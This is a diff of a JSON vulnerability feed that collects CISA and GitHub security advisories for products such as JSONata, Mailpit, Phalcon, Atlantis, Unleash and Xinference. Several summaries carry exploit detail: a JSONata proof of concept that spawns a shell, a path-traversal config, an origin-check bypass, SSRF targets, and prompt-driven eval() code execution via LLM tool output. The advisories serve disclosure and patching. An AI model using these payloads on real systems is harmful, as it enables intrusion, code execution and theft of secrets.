@@ -1,48 +1,10 @@
 {
-  "generated": "2026-08-21T18:20:01.168533+00:00",
-  "total": 32,
-  "kev": 2,
-  "zero_day": 11,
+  "generated": "2026-08-22T00:31:35.190206+00:00",
+  "total": 16,
+  "kev": 0,
+  "zero_day": 10,
   "enriched": 0,
   "findings": [
-    {
-      "id": "CVE-2026-69836",
-      "title": "CVE-2026-69836 \u2014 Microsoft Entra ID Deserialization of Untrusted Data Vulnerability",
-      "summary": "Vendor: Microsoft | Product: Entra ID . Microsoft Entra ID formerly known as Azure Active Directory contains a deserialization of untrusted data vulnerability which could allow an unauthorized attacker to execute code over a network. Required action: Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA\u2019s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA\u2019s \u201cForensics Triage Requirements\u201d (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines. (due 2026-08-24)",
-      "link": "https://nvd.nist.gov/vuln/detail/CVE-2026-69836",
-      "published": "2026-08-21",
-      "source": "CISA KEV",
-      "tags": [
-        "cisa",
-        "kev",
-        "actively-exploited"
-      ],
-      "cve_ids": [
-        "CVE-2026-69836"
-      ],
-      "is_kev": true,
-      "is_zero_day": true,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-73570",
-      "title": "CVE-2026-73570 \u2014 Zimbra Collaboration Suite (ZCS) OS Command Injection Vulnerability",
-      "summary": "Vendor: Synacor | Product: Zimbra Collaboration Suite (ZCS). Zimbra Collaboration Suite (ZCS) contains an OS command injection vulnerability which could allow an unauthenticated attacker to send specially crafted SMTP requests that may result in execution of arbitrary operating system commands as the Zimbra user. Required action: Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA\u2019s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA\u2019s \u201cForensics Triage Requirements\u201d (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines. (due 2026-08-24)",
-      "link": "https://nvd.nist.gov/vuln/detail/CVE-2026-73570",
-      "published": "2026-08-21",
-      "source": "CISA KEV",
-      "tags": [
-        "cisa",
-        "kev",
-        "actively-exploited"
-      ],
-      "cve_ids": [
-        "CVE-2026-73570"
-      ],
-      "is_kev": true,
-      "is_zero_day": true,
-      "is_high_severity": false
-    },
     {
       "id": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa26-194a",
       "title": "Improve Router Hygiene to Protect Against Russian State-Sponsored Targeting",
@@ -86,24 +48,6 @@
         "malware"
       ],
       "cve_ids": [],
-      "is_zero_day": true,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-54156",
-      "title": "node-opcua: Unbounded nonce cache enables unauthenticated heap exhaustion DoS",
-      "summary": "**Summary**\nA process-global nonce cache with no eviction policy allows an unauthenticated remote attacker to exhaust server heap memory by repeatedly opening sessions, causing the node-opcua server process to crash.\n\n**Affected versions:** <= 2.165.0\n**Tested version:** 2.165.0\n**CVSS Score:** 7.5 (High)\n**CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\n**CWE:** CWE-770 Allocation of Resources Without Limits or Throttling\n\n---\n\n**Root Cause**\n\nIn `packages/node-opcua-secure-channel/source/server/server_secure_channel_layer.ts` at line 156, `g_alreadyUsedNonce` is a process-global object used to track previously seen nonces for replay detection. Entries are added on every `OpenSecureChannelRequest` and every `CreateSession` request but are never removed or expired.\n\nAn unauthenticated attacker can exploit the `CreateSession` path (which requires no certificate) to accumulate nonce entries indefinitely. Even with `maxSessions=10` limiting concurrent sessions, nonces persist after session expiry, allowing slow but reliable heap exhaustion across repeated connection cycles.\n\n---\n\n**Measured Impact**\n\nDynamically confirmed heap growth:\n- 5,000 unique nonces \u2192 +1.23 MB resident heap, no eviction after explicit GC\n- Projected: 10^6 nonces \u2192 ~246 MB resident heap\n- Achievable OOM on default Node.js heap limits\n\n---\n\n**Suggested Fix**\n\nAdd a TTL-based eviction policy to `g_alreadyUsedNonce`. Nonces should be expired after the maximum session timeout (or a reasonable fixed window, e.g. 1 hour). A Map with timestamp entries and periodic cleanup is sufficient.\n\n---\n\nI am following a 90-day responsible disclosure policy. I am happy to provide additional technical details under embargo. Please confirm receipt at your earliest convenience.\n\nReporter: Stanley Tobias\nDiscovery date: 2026-03-23",
-      "link": "https://github.com/advisories/GHSA-6wvw-vrw4-363w",
-      "published": "2026-08-20T18:35:41Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-54156"
-      ],
       "is_zero_day": true,
       "is_high_severity": true
     },
@@ -220,11 +164,11 @@
       "is_high_severity": false
     },
     {
-      "id": "CVE-2026-67448",
-      "title": "Mailpit: WebSocket origin check bypass via percent-encoded path (regression of CVE-2026-22689)",
-      "summary": "## Summary\n\nThe cross-site WebSocket hijacking fix was reimplemented as an origin check gated on a raw-URI prefix test, but Go's ServeMux routes on the percent-decoded path, so requesting /%61pi/events reaches the WebSocket handler while skipping the only origin control, and the upgrader itself accepts every origin. Confirmed at HEAD 408b30d. Affects 1.29.0 through 1.30.5.\n\n## The defect\n\nTwo halves that were each correct in isolation. server/websockets/client.go accepts any origin and delegates the check elsewhere:\n\n```go\nvar upgrader = websocket.Upgrader{                       // line 33\n    ...\n    CheckOrigin: func(_ *http.Request) bool {            // line 37\n        // origin is checked via server.go's CORS settings\n        return true                                      // line 39\n    },\n}\n```\n\nserver/server.go performs that check but keys it on the RAW request target:\n\n```go\nif strings.HasPrefix(r.RequestURI, config.Webroot+\"api/\") || htmlPreviewRouteRe.MatchString(r.RequestURI) {   // line 320\n    if allowed := corsOriginAccessControl(r); !allowed {\n        http.Error(w, \"Blocked due to CORS violation\", http.StatusForbidden)\n        return\n    }\n```\n\nr.RequestURI is the untouched wire target; Go's ServeMux routes on the percent-DECODED path. So for /%61pi/events: `strings.HasPrefix(\"/%61pi/events\", \"/api/\")` is FALSE (origin check skipped), ServeMux decodes %61 to \"a\" and routes to /api/events, and the upgrader's CheckOrigin returns true.\n\nMeasured, default config, no auth: /api/events with `Origin: https://evil.example` returns 403; /%61pi/events with the same Origin returns 101 Switching Protocols and begins streaming. With a message delivered over SMTP while the cross-origin socket was open, the attacker origin received the ID, Message-Id, From, To, Cc, Bcc, Subject (\"SECRET password reset token abc123\"), size, tags, and body Snippet, live. WebSockets are not subject to CORS response-header enforcement, so the absent Access-Control-Allow-Origin header p",
-      "link": "https://github.com/advisories/GHSA-8r62-w5wh-fc5m",
-      "published": "2026-08-20T21:34:58Z",
+      "id": "CVE-2026-77415",
+      "title": "JSONata vulnerable to Arbitrary Code Execution via crafted JSONata expressions",
+      "summary": "Before JSONata `2.2.1` and `1.8.8` it was possible to execute arbitrary code with\ncrafted expressions, due to:\n- overwriting `$clone` allowing mutation of objects via transforms (see\n[`evaluateTransformExpression`](https://github.com/jsonata-js/jsonata/blob/8ee4476f8a228bfc7a62979ae0a9c13a4043cd03/src/jsonata.js#L1304-L1314))\n- it being possible to destruct jsonata functions/lambdas (e.g. `$merge.*`)\n- [applyProcedure](https://github.com/jsonata-js/jsonata/blob/8ee4476f8a228bfc7a62979ae0a9c13a4043cd03/src/jsonata.js#L1670C20-L1675)\nusing `proc.arguments.forEach` and not `Array.prototype.forEach`\n\nWhich could be chained to execute arbitrary code.\n\nThis was fixed with:\n\n- https://github.com/jsonata-js/jsonata/pull/799\n(https://github.com/jsonata-js/jsonata/pull/799/changes#diff-de23c1b6e199d0e59406a284aae5fa7be63fcbbff706829913dba73dcdeb061cL1673-R1673)\n- https://github.com/jsonata-js/jsonata/pull/800\n- https://github.com/jsonata-js/jsonata/pull/802\n\nWhich are included in the `2.2.1` release. Fixes were then back-ported to the `1.8.8` release.\n\n## PoC\n\n```js\nimport jsonata from \"jsonata\";\n\nconst expression = jsonata(`\n(\n    $obj := {};\n    $clone := function($o) { $o };\n    $m := ($merge.*)[1];\n\n    $fn := function($a) {\n        (\n            $a({\"value\":\"lg\"},\"__lookupGetter__\");\n            $a({\"value\":\"x\"},\"x\");\n        )\n    };\n\n    $nop := function() { $ };\n\n    $capture := function($val) {\n        $obj ~> | $obj | {\"x\": 1, \"y\": 1, \"lg\":$lg} |\n    };\n\n    $ ~> | $ | $m([$nop,{\"_jsonata_lambda\":false}])|;\n    $ ~> | $ | {\"arguments\":{\"forEach\": $spread($fn)}}|;\n    $ ~> | $ | {\"body\":$m([$capture,{\"_jsonata_lambda\":false}]).body}|;\n    $func := $m([$,{\"_jsonata_lambda\":true}]);\n    $func();\n\n    $gP := $obj.lg(\"__proto__\");\n\n    $afn:=$spread($fn);\n    $afn{\"x\":$gP().constructor(\"return process.getBuiltinModule('child_process').execSync('sh',{stdio:'inherit'})\")()};\n)\n`);\n\nawait expression.evaluate({});\n```\n\n## References\n\n- https://github.com/jsonata-js/jsonata/p",
+      "link": "https://github.com/advisories/GHSA-66mm-25pp-rfff",
+      "published": "2026-08-21T21:04:19Z",
       "source": "GitHub Security Advisories",
       "tags": [
         "github",
@@ -232,17 +176,17 @@
         "oss"
       ],
       "cve_ids": [
-        "CVE-2026-67448"
+        "CVE-2026-77415"
       ],
       "is_zero_day": false,
       "is_high_severity": true
     },
     {
-      "id": "CVE-2026-55451",
-      "title": "gettext-converter: Prototype pollution in js2i18next() via crafted translation keys",
-      "summary": "### Impact\n\n`js2i18next()` is vulnerable to prototype pollution. When converting translations, it splits nested keys on the key separator (default `##`) and uses each segment as a dynamic object key while building the output object. A key whose segment is `__proto__` (e.g. `__proto__##gcPolluted`) causes the converter to resolve `Object.prototype` as the nested write target and assign the translated value onto it, polluting `Object.prototype` for the whole runtime.\n\nAny application that converts translation data (PO / i18next JS objects) originating from an untrusted or user-controlled source is affected. Prototype pollution can lead to denial of service and, depending on the surrounding application, may enable further attacks.\n\n### Patches\n\nFixed in `gettext-converter@1.3.3`. Key segments equal to `__proto__`, `constructor`, or `prototype` are now rejected before being used as dynamic object keys.\n\n### Workarounds\n\nUpgrade to `1.3.3`. If upgrading is not immediately possible, sanitize/validate translation keys before passing them to `js2i18next()` and reject any key whose `##`-separated segments include `__proto__`, `constructor`, or `prototype`.",
-      "link": "https://github.com/advisories/GHSA-f4jp-rw7w-ccwg",
-      "published": "2026-08-20T20:11:13Z",
+      "id": "CVE-2026-61539",
+      "title": "Xinference vulnerable to remote code execution via unsafe `eval()` in Llama3 tool-call parsing",
+      "summary": "### Summary\n\nXinference used Python's unsafe `eval()` function when parsing Llama3 tool-call output generated by a large language model. Because the model output can be influenced by attacker-controlled prompts sent to the chat completion API, a remote attacker can craft prompts that cause the model to return a Python expression. Xinference then evaluates that expression on the server while post-processing the tool-call result. In the tested default deployment, authentication was not enabled, so the vulnerability was exploitable by an unauthenticated remote attacker through the `/v1/chat/completions` endpoint.\n\n### Details\n\nUsers can interact with deployed models through Xinference's OpenAI-compatible `/v1/chat/completions` API. The request entry point is implemented in `xinference/api/restful_api.py`; non-streaming requests call the model instance's `chat()` method and return the inference result.\n\nWhen the Transformers backend is used, inference results flow through the batching logic in `xinference/model/llm/transformers/core.py`. Non-streaming chat results are handled by `handle_chat_result_non_streaming()`. If the request contains a `tools` field, Xinference calls `_post_process_completion()` to parse tool-call output from the model response.\n\nThe Llama3 tool-call parser is implemented in `xinference/model/llm/tool_parsers/llama3_tool_parser.py`. In affected versions, `extract_tool_calls()` parsed model output with `eval()`:\n\n```python\ndef extract_tool_calls(\n    self, model_output: str\n) -> List[Tuple[Optional[str], Optional[str], Optional[Dict[str, Any]]]]:\n    try:\n        data = eval(model_output, {}, {})\n        return [(None, data[\"name\"], data[\"parameters\"])]\n    except Exception:\n        return [(model_output, None, None)]\n```\n\nThe intended behavior was to convert a Python dictionary-like string generated by the model into a dictionary object. However, `eval()` executes the input as a Python expression, and `eval(model_output, {}, {})` is not a security",
+      "link": "https://github.com/advisories/GHSA-x2rj-828p-hx9m",
+      "published": "2026-08-21T20:56:37Z",
       "source": "GitHub Security Advisories",
       "tags": [
         "github",
@@ -250,17 +194,17 @@
         "oss"
       ],
       "cve_ids": [
-        "CVE-2026-55451"
+        "CVE-2026-61539"
       ],
       "is_zero_day": false,
       "is_high_severity": true
     },
     {
-      "id": "GHSA-8cfw-pcwh-v63w",
-      "title": "Winter: Authenticated Twig sandbox escape in CMS SecurityPolicy (bypass of CVE-2024-54149)",
-      "summary": "### Impact\n\nAffected versions of Winter CMS allow authenticated backend users with CMS template-editing permissions to escape the Twig sandbox (\"safe mode\") that is meant to restrict what template code can do. Using any of the following permissions, an attacker can read and modify arbitrary database records, execute arbitrary SQL (including DDL such as `DROP TABLE`), exfiltrate sensitive data such as backend administrator credentials, and achieve remote code execution by injecting PHP into a CMS page, layout, or partial code section:\n\n- **`cms.manage_pages`**\n- **`cms.manage_layouts`**\n- **`cms.manage_partials`**\n\nThis is an incomplete-fix follow-up to CVE-2024-54149 (GHSA-xhw3-4j3m-hq53). That fix added a blocklist of dangerous methods to `System\\Twig\\SecurityPolicy`, but the blocklist missed a large number of equivalent methods and did not account for the way Eloquent models forward calls to the query builder. As a result the sandbox could be bypassed through \u2014 among others \u2014 `saveQuietly()`/`deleteQuietly()`, `increment()`/`decrement()`, `newQuery()`, `getConnection()`, `getConnectionResolver()`, relation and pivot methods, and higher-order collection methods that execute callables.\n\nTo actively exploit this issue, an attacker would need an authenticated backend account with one of the permissions listed above. These permissions are intended for trusted developers/administrators, and the sandbox is the additional protection layer this advisory is concerned with.\n\n### Patches\n\n`System\\Twig\\SecurityPolicy` has been reworked so that the blocklist reflects the real method-forwarding behaviour of the database layer rather than a flat list of method names. A method blocked on the query builder is now also blocked when it is reached through a model, Eloquent builder, or relation (via a transitive forwarder chain), which closes the `__call` forwarding escape that made the previous blocklist bypassable. In addition, the per-class blocklists have been expanded, the databas",
-      "link": "https://github.com/advisories/GHSA-8cfw-pcwh-v63w",
-      "published": "2026-08-20T18:44:23Z",
+      "id": "CVE-2026-59989",
+      "title": "Phalcon Volt compiler `join` filter compile-time PHP code injection (SSTI leads to RCE)",
+      "summary": "## Summary\n\nThe Volt template compiler in Phalcon generates the PHP for the `join` filter by string-concatenating the filter's **raw template-literal argument bytes** with no escaping. The separator literal is dropped verbatim between two single quotes the compiler emits, and the piped array argument is emitted completely bare. A Volt template whose `join` arguments are attacker-influenced can therefore break out of the generated `join('\u2026')` call and inject arbitrary PHP into the compiled template. Volt writes that compiled template to a cache file and `require()`s it at render time, so the injected PHP executes i.e. compile-time PHP code injection (server-side template injection -> remote code execution) for any application that compiles attacker-controlled Volt source.\n\n## Details \n\n### Root cause\n\n`phalcon/Mvc/View/Engine/Volt/Compiler.zep:2544-2546`:\n\n```zephir\ncase \"join\":\n    return \"join('\" . funcArguments[1][\"expr\"][\"value\"]\n        . \"', \" . funcArguments[0][\"expr\"][\"value\"] . \")\";\n```\n\n`funcArguments[1][\"expr\"][\"value\"]` (the separator) and `funcArguments[0][\"expr\"][\"value\"]` (the piped array) are the **raw values** of the parsed template tokens. Unlike every other expression in the compiler, they are **not** routed through `expression()` and receive no escaping: the separator value is spliced verbatim inside the `join('` \u2026 `'` quotes with no neutralisation of `'`, and the array value is emitted with no quoting at all. Volt's scanner stores string-literal bytes verbatim (escape sequences are not decoded), so attacker bytes survive intact into the generated PHP.\n\n**Generated-C ground truth** -> `build/phalcon/phalcon.zep.c` (Phalcon 5.15.0):\n\n```c\nZEPHIR_CONCAT_SVSVS(return_value, \"join('\", &_19$$24, \"', \", &_22$$24, \")\");\n```\n\ni.e. literally `\"join('\" + separator + \"', \" + array + \")\"` with both attacker-controlled fragments unescaped.\n\nThe compiled output is then written to a cache file and `require`d by `Phalcon\\Mvc\\View\\Engine\\Volt::render()`, so any PH",
+      "link": "https://github.com/advisories/GHSA-hrwp-4hh9-c8r8",
+      "published": "2026-08-21T20:55:56Z",
       "source": "GitHub Security Advisories",
       "tags": [
         "github",
@@ -268,17 +212,17 @@
         "oss"
       ],
       "cve_ids": [
-        "CVE-2024-54149"
+        "CVE-2026-59989"
       ],
       "is_zero_day": false,
       "is_high_severity": true
     },
     {
-      "id": "CVE-2026-63202",
-      "title": "netty-incubator-codec-ohttp BinaryHttpParser: Unauthenticated CPU-exhaustion DoS via infinite loop in field-section decoding",
-      "summary": "# BinaryHttpParser: Unauthenticated CPU-exhaustion DoS via infinite loop in field-section decoding\n\n- **ID:** BHTTP-LOOP-001\n- **Severity:** High\n- **CVSS v3.1:** 7.5 \u2014 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`\n- **CWE:** CWE-835 (Loop with Unreachable Exit Condition) \u2014 secondary CWE-400 (Uncontrolled Resource Consumption)\n- **Affected component:** `codec-bhttp` \u2192 `io.netty.incubator.codec.bhttp.BinaryHttpParser#readFieldSection`, file `codec-bhttp/src/main/java/io/netty/incubator/codec/bhttp/BinaryHttpParser.java:619-626`\n- **Affected version:** netty-incubator-codec-ohttp HEAD `d3f2b49` (release `0.0.22.Final` + 3 commits). The loop has existed since the parser was introduced and is present in the latest code; all published advisory fixes are already applied.\n- **Reachable from:** `io.netty.incubator.codec.ohttp.OHttpRequestResponseContext$ContentDecoder#decodeChunk` (`codec-ohttp/.../OHttpRequestResponseContext.java:214`), i.e. the auto-wired OHTTP server **and** client codecs.\n- **Confidence:** High (empirically reproduced hang + thread dump against the unmodified parser).\n\n## Summary\n\n`BinaryHttpParser` decodes Binary HTTP (RFC 9292) messages. An OHTTP gateway/client built on this library feeds the **decrypted** OHTTP body straight into `BinaryHttpParser.parse(...)`. The field-section decoding loop terminates only on the exact condition `fieldSectionLength != 0` and relies on a Java `assert` to guarantee forward progress. Because (a) the loop counter can be driven negative and (b) `readFieldLine(...)` legitimately consumes **zero** bytes and returns `null` on a truncated/over-long field line, the loop can spin forever. Assertions are disabled in any normal production JVM, so the two `assert` statements meant to catch this provide no protection.\n\nA single ~17-byte Binary HTTP message \u2014 encapsulated by an unauthenticated attacker inside a normal OHTTP request, using the gateway's **public** key configuration \u2014 pins one Netty event-loop thread at 100% CPU per",
-      "link": "https://github.com/advisories/GHSA-4899-mpch-38p3",
-      "published": "2026-08-20T18:43:38Z",
+      "id": "CVE-2026-64679",
+      "title": "Atlantis Workspace Handling has Path Traversal that Allows Out-of-Bounds Directory Deletion/Creation",
+      "summary": "### Summary\nAtlantis versions `>= 0.19.8` and `< 0.45.0` did not consistently validate user-controlled `workspace` values before using them to construct local workspace paths.\n\nA crafted workspace value containing path traversal segments could cause Atlantis to resolve workspace paths outside the intended per-pull workspace directory. In vulnerable versions or code paths, Atlantis could create, use, or remove/recreate out-of-bounds directories with the privileges of the Atlantis process user, before Terraform rejected the invalid workspace name.\n\nThe issue is fixed in Atlantis `0.45.0`.\n\n### Details\nThe issue is a path traversal vulnerability in Atlantis workspace handling. `workspace` values can be supplied through repository-level `atlantis.yaml` configuration accepted by the server or through authenticated API input. A value such as `../../../../../../../../tmp/f1-canary` could escape the intended Atlantis workspace root.\n\nIn affected code paths, Atlantis used the resolved workspace path for local working-directory operations. For example, workspace values were joined into repo pull paths, and clone preparation paths could call directory removal/recreation operations such as `os.RemoveAll` and `os.MkdirAll` on the resolved directory.\n\n### PoC\nIn a local PoC using repo-level `atlantis.yaml`, the following workspace value caused Atlantis to resolve and use `/tmp/f1-canary` outside `~/.atlantis/repos/...`:\n\n```yaml\nversion: 3\nprojects:\n  - dir: .\n    workspace: ../../../../../../../../tmp/f1-canary\n```\n\nAtlantis logs showed the out-of-bounds directory being created and Terraform being run with `/tmp/f1-canary` as the working directory. Terraform rejected the workspace name only after Atlantis had already used the out-of-bounds path.\n\n### Impact\nA user who can cause Atlantis to process a crafted `workspace` value, for example through repository-level `atlantis.yaml` configuration accepted by the server or an authenticated `/api/plan` request, may cause filesystem ope",
+      "link": "https://github.com/advisories/GHSA-26w5-6g95-gj28",
+      "published": "2026-08-21T20:55:33Z",
       "source": "GitHub Security Advisories",
       "tags": [
         "github",
@@ -286,17 +230,17 @@
         "oss"
       ],
       "cve_ids": [
-        "CVE-2026-63202"
+        "CVE-2026-64679"
       ],
       "is_zero_day": false,
       "is_high_severity": true
     },
     {
-      "id": "CVE-2026-57570",
-      "title": "Laravel Backpack CRUD: HasMany/MorphMany relation fields allow cross-tenant record re-parenting (IDOR) via attachManyRelation",
-      "summary": "## Vulnerability Details\n\nAffected area: HasMany / MorphMany relation handling during CRUD create and update operations  \nCWE: CWE-862 \u2014 Missing Authorization  \nSeverity: Medium  \nCVSS: 6.5 \u2014 CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N\n\n### Summary\n\nBackpack CRUD contained an authorization issue in the way certain HasMany and MorphMany relationship fields were processed during create and update operations.\n\nWhen an admin form allowed users to manage multiple related records, Backpack could update related model records based on submitted primary keys without sufficiently checking whether those records were eligible to be associated with the current parent model.\n\nThis could allow an authenticated, low-privileged admin user to affect related records outside the intended authorization or tenancy boundary, if the affected CRUD form exposed this type of relationship field.\n\n### Root Cause\n\nThe vulnerable logic processed submitted relationship values and updated matching related records without consistently limiting those updates to records that already belonged to the current parent model, or to records allowed by the developer-defined relation scope.\n\nAs a result, a user with permission to edit one parent record could potentially cause unrelated child records to be reassigned, detached, nulled, or deleted as a side effect of saving the form.\n\nThis issue is separate from earlier fixes that scoped direct CRUD operations on the main entity. Those protections covered the model being directly edited, but they did not fully cover secondary models modified through relationship-saving logic.\n\n### Impact\n\nAn authenticated admin user with access to an affected CRUD operation could potentially cause unauthorized changes to related records.\n\nPossible impact includes:\n\n- Unauthorized reassignment of related records across users, parents, or tenants.\n- Unauthorized detachment or removal of related records.\n- Data integrity issues in multi-tenant or permission-sensitive applications.",
-      "link": "https://github.com/advisories/GHSA-42vx-43vc-x6pr",
-      "published": "2026-08-20T18:42:31Z",
+      "id": "CVE-2026-63004",
+      "title": "Unleash: Addon webhook URL is dialed server-side with no internal-address filtering, enabling SSRF to internal services / cloud metadata and exfiltration of configured request headers",
+      "summary": "## Summary\n\nUnleash's addon/integration subsystem lets an operator configure a webhook (and the Slack, Microsoft Teams, Datadog, and New Relic integrations) with a target `url` parameter. Whenever a subscribed feature-flag event fires, the Unleash server itself issues an HTTP request to that configured URL. The URL is taken verbatim from the addon's `parameters.url` and passed straight to the HTTP client (`ky`) with no validation of the host: there is no allow-list, no deny-list, and no blocking of loopback, link-local, RFC1918, or cloud-metadata addresses anywhere in the addon code path. A principal able to create or update an addon can therefore point the server at an internal-only URL \u2014 for example `http://169.254.169.254/latest/meta-data/\u2026` (cloud IMDS), `http://127.0.0.1:<port>/\u2026` (a service bound to localhost), or any RFC1918 host \u2014 and cause the Unleash server to dial it from inside the trust boundary.\n\nThe request is blind (the response body is not returned to the caller), but the addon records whether the request succeeded and its HTTP status into the integration-event log, giving a status/timing oracle for probing internal services. In addition, the webhook provider forwards the operator-configured `Authorization` header and arbitrary `customHeaders` to whatever host the `url` points at (Datadog forwards `DD-API-KEY`), so an attacker who controls or can observe the target host also obtains those secrets. The full feature-event JSON is POSTed to the chosen internal endpoint as the request body.\n\nCreating/updating addons is gated by the root permissions `CREATE_ADDON` / `UPDATE_ADDON`. These are not the super-admin `ADMIN` permission and not project-scoped; an instance admin can place them in a custom root role and delegate them to a non-super-admin user, who then has exactly enough privilege to weaponize the integration into an SSRF primitive without holding full admin. This bounds the finding to an authenticated, addon-management-privileged actor (reflecte",
+      "link": "https://github.com/advisories/GHSA-5vf6-jrqr-78fj",
+      "published": "2026-08-21T19:14:45Z",
       "source": "GitHub Security Advisories",
       "tags": [
         "github",
@@ -304,241 +248,7 @@
         "oss"
       ],
       "cve_ids": [
-        "CVE-2026-57570"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-54622",
-      "title": "django CMS: Clipboard copy IDOR discloses unauthorized plugin content",
-      "summary": "### Summary\n  The clipboard copy paths of the `copy_plugins` admin endpoint validate only   the target (the user's own clipboard) and skip source-side authorization. A staff user can copy plugins out of a placeholder they have no permission on   into their clipboard, then read the (secret) content.\n\n  ### Details\n  In `cms/admin/placeholderadmin.py`, `_copy_plugin_to_clipboard` and   `_copy_placeholder_to_clipboard` check `has_copy_plugins_permission`, which only  evaluates `request.toolbar.clipboard.has_add_plugins_permission(...)` \u2014 the\n  clipboard belongs to the requesting user, and `check_source` is likewise  applied only to the clipboard. The source placeholder identified by the  attacker-supplied `source_placeholder_id` / `source_plugin_id` is never  authorization-checked. (The placeholder-to-placeholder copy path,  `has_copy_from_placeholder_permission`, correctly checks both sides.)\n\n  ### Impact\n  A staff user holding the global add permission for a plugin type, but with no  access to a given placeholder/page, can copy that placeholder's plugins into  their own clipboard and read content (e.g. link names/URLs, text) they cannot  reach through the normal edit endpoints.\n\n  Requires `CMS_PERMISSION=True` with per-placeholder/page restrictions.\n\n  ### Patches\n  Fixed in 5.0.8: the clipboard copy paths now also verify   source-side permission (`has_add_plugins_permission` + `check_source` on the  source placeholder), matching placeholder-to-placeholder copy.\n\n  ### Workarounds\n  None. Upgrade is recommended.\n\n  ### Credits\n  Reported by the security team at the University of Sydney ([@reporter]).",
-      "link": "https://github.com/advisories/GHSA-4xfr-4p46-gc6p",
-      "published": "2026-08-20T18:42:11Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-54622"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-54261",
-      "title": "Wagtail: Improper permission handling in image preview",
-      "summary": "### Impact\nDue to a missing permission check on the image preview endpoint, a user with access to the Wagtail admin can preview any image. The existing data of the image object itself is not exposed. The vulnerability is not exploitable by an ordinary site visitor without access to the Wagtail admin.\n\n### Patches\nPatched versions have been released as Wagtail 7.0.8, 7.3.3, 7.4.2.\n\n### Workarounds\nFor sites that cannot easily upgrade to a current supported version, the vulnerability can be patched by adding the following code to `urls.py` URL pattern declarations to override the vulnerable view.\n\n```python\nfrom django.core.exceptions import PermissionDenied\nfrom django.shortcuts import get_object_or_404\nfrom django.urls import path\nfrom wagtail.admin import urls as wagtailadmin_urls\nfrom wagtail.images.permissions import permission_policy\nfrom wagtail.images.views import preview\n\n\ndef patched_preview(request, image_id, filter_spec):\n    image = get_object_or_404(get_image_model(), id=image_id)\n\n    if not permission_policy.user_has_permission_for_instance(request.user, \"change\", image):\n        raise PermissionDenied\n\n    return preview(request, image_id, filter_spec)\n\n\nurlpatterns = [\n    # Example where the CMS admin is at /admin/.\n    # Add this before the Wagtail admin URLs registration, with the same sub-path.\n    path(\"admin/images/<int:image_id>/preview/<str:filter_spec>/\", patched_preview)\n    path(\"admin/\", include(wagtailadmin_urls)),\n]\n```\n\n### Acknowledgements\nMany thanks to @0x1saac and @harshakshit for reporting this issue.\n\n\n### For more information\nIf you have any questions or comments about this advisory:\n\n* Visit Wagtail's [support channels](https://docs.wagtail.org/en/stable/support.html)\n* Email us at [security@wagtail.org](mailto:security@wagtail.org) (view our [security policy](https://github.com/wagtail/wagtail/security/policy) for more information).",
-      "link": "https://github.com/advisories/GHSA-r6p4-grq7-xm4m",
-      "published": "2026-08-20T18:40:18Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-54261"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-54259",
-      "title": "Wagtail: Improper restriction handling on Documents and Images chosen endpoints",
-      "summary": "### Impact\nThe Documents and Images chooser's chosen endpoint incorrectly listed items for which the user has not been granted choose permission. A user with access to the Wagtail admin could see the filename and name and URLs of documents and images in those collections.\n\nThe vulnerability is not exploitable by an ordinary site visitor without access to the Wagtail admin.\n\n### Patches\nPatched versions have been released as Wagtail 7.0.8, 7.3.3, 7.4.2.\n\n### Workarounds\nN/A\n\n### Acknowledgements\nMany thanks to @harshakshit for reporting this issue.\n\n\n### For more information\nIf you have any questions or comments about this advisory:\n\n* Visit Wagtail's [support channels](https://docs.wagtail.org/en/stable/support.html)\n* Email us at [security@wagtail.org](mailto:security@wagtail.org) (view our [security policy](https://github.com/wagtail/wagtail/security/policy) for more information).",
-      "link": "https://github.com/advisories/GHSA-h54r-xq46-qwqm",
-      "published": "2026-08-20T18:40:09Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-54259"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-54251",
-      "title": "netty-incubator-codec-ohttp: [OHttpServerCodec] Native Direct-Memory Leak on AEAD Decryption Failure Leads to Gateway Denial of Service",
-      "summary": "The **netty-incubator-codec-ohttp** library implements Oblivious HTTP (OHTTP) gateway and client functionality using Netty's `ByteBuf` memory management. When an OHTTP gateway processes encrypted client requests, it allocates a pooled direct (native off-heap) `ByteBuf` to hold the decrypted plaintext before the AEAD tag is verified. If the AEAD tag check fails \u2014 meaning the ciphertext is invalid \u2014 the decryption method throws a `CryptoException`, but the allocated buffer is never released because no `try/finally` block guards the allocation.",
-      "link": "https://github.com/advisories/GHSA-vmr9-j6wf-pmh2",
-      "published": "2026-08-20T18:39:50Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-54251"
